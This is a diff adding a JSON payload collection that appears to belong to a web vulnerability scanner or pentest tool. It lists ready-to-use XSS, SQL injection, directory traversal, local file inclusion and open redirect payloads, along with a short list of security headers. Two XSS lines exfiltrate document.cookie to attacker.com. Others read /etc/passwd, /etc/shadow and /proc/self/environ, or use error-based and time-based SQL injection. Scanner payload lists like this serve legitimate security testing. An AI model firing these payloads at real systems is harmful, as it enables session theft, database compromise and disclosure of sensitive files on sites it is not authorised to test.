@@ -1,0 +1,75 @@
+{
+  "xss_payloads": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "\"><script>alert('XSS')</script>",
+    "'><script>alert('XSS')</script>",
+    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
+    "<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>",
+    "<body onload=alert('XSS')>",
+    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
+  ],
+  "sql_injection_payloads": [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "') OR ('1'='1",
+    "\") OR (\"1\"=\"1",
+    "1' ORDER BY 1--+",
+    "1\" ORDER BY 1--+",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "\" UNION SELECT NULL,NULL,NULL--",
+    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a);--",
+    "1' AND SLEEP(5)--+"
+  ],
+  "directory_traversal_payloads": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "../../../../../../etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "....//....//....//etc/passwd",
+    "../../../etc/passwd%00",
+    "../../../etc/passwd0x00",
+    "/var/www/../../etc/passwd"
+  ],
+  "lfi_payloads": [
+    "/etc/passwd",
+    "/etc/hosts",
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/proc/self/exe",
+    "/etc/shadow",
+    "C:\\Windows\\win.ini",
+    "C:\\boot.ini",
+    "/var/log/apache/access.log",
+    "/var/log/apache2/access.log"
+  ],
+  "open_redirect_payloads": [
+    "https://evil.com",
+    "//evil.com",
+    "////evil.com",
+    "\\\\evil.com",
+    "/\\evil.com",
+    "https:evil.com",
+    "https://evil.com/%2F..%2F",
+    "javascript:alert(document.domain)",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
+    "%09https://evil.com"
+  ],
+  "security_headers": {
+    "important_headers": [
+      "Content-Security-Policy",
+      "X-XSS-Protection",
+      "X-Content-Type-Options",
+      "X-Frame-Options",
+      "Strict-Transport-Security",
+      "Referrer-Policy",
+      "Feature-Policy",
+      "Permissions-Policy",
+      "Access-Control-Allow-Origin"
+    ]
+  }
+} 
